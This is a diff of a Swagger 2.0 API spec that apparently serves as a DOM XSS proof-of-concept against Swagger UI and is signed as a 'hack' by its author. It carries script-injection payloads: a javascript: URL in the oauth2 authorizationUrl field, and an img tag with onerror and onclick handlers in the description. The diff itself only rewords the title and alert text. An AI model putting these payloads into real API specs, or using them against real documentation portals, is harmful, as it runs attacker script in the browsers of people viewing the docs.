@@ -2,10 +2,10 @@ swagger: '2.0'
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: javascript:alert("XSS Hack alert By Drocapy")//
+    authorizationUrl: javascript:alert("XSS Hack By Drocapy")//
 info:
   version: "1.0.0"
-  title: DOM XSS Hack Image & Javascript Code by Drocapy
+  title: DOM XSS Hack & Javascript Code by Drocapy
   description: Hack By Drocapy <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">////
 paths:
   /Drocapy:
@@ -30,3 +30,4 @@ paths:
       responses:
         '200':
           description: No response was specified
+
